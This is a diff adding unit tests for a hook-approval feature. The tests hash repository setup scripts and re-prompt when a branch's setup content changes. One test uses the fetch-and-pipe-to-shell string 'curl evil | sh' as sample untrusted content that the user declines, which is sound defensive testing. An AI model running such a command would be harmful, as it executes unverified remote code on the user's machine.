@@ -3,10 +3,13 @@ import type { AppState } from '@/store/types'
 import type { PersistedTrustedOrcaHooks } from '../../../shared/orca-yaml-hook-types'
 import {
   __resetTrustPromptChainForTests,
+  confirmCreatedWorktreeSetupContent,
+  ensureHooksApproved,
   ensureHooksConfirmed,
   readAndConfirmRuntimeIssueCommand
 } from './ensure-hooks-confirmed'
 import { hashOrcaHookScript } from './orca-hook-trust'
+import { createHash } from 'node:crypto'
 import {
   createCompatibleRuntimeStatusResponseIfNeeded,
   type RuntimeEnvironmentCallRequest
@@ -464,5 +467,55 @@ describe('ensureHooksConfirmed', () => {
 
     expect(decision).toBe('skip')
     expect(pending).toHaveLength(0)
+  })
+
+  it('returns the approved setup hash the host recomputes with node crypto', async () => {
+    const { state, pending } = createTestState()
+    hooksCheckMock.mockResolvedValue({
+      hasHooks: true,
+      hooks: { scripts: { setup: 'pnpm install' } },
+      mayNeedUpdate: false
+    })
+
+    const promise = ensureHooksApproved(state, 'repo-1', 'setup')
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    pending[0].resolve('run')
+
+    await expect(promise).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: createHash('sha256').update('pnpm install').digest('hex')
+    })
+  })
+
+  it('approves the empty setup content without prompting so a branch cannot add unseen scripts', async () => {
+    const { state, pending } = createTestState()
+    hooksCheckMock.mockResolvedValue({ hasHooks: false, hooks: null, mayNeedUpdate: false })
+
+    await expect(ensureHooksApproved(state, 'repo-1', 'setup')).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: await hashOrcaHookScript('')
+    })
+    expect(pending).toHaveLength(0)
+  })
+
+  it('sends no hash when the whole repo is trusted, so any branch content runs as before', async () => {
+    const { state } = createTestState()
+    state.trustedOrcaHooks['repo-1'] = { all: { approvedAt: 1 } }
+
+    await expect(ensureHooksApproved(state, 'repo-1', 'setup')).resolves.toEqual({
+      decision: 'run'
+    })
+  })
+
+  it('re-prompts with the created branch setup content that differs', async () => {
+    const { state, pending } = createTestState()
+
+    const promise = confirmCreatedWorktreeSetupContent(() => state, 'repo-1', 'curl evil | sh')
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    expect(pending[0].data.scriptContent).toBe('curl evil | sh')
+    expect(pending[0].data.scriptKind).toBe('setup')
+    pending[0].resolve('skip')
+
+    await expect(promise).resolves.toEqual({ decision: 'skip' })
   })
 })
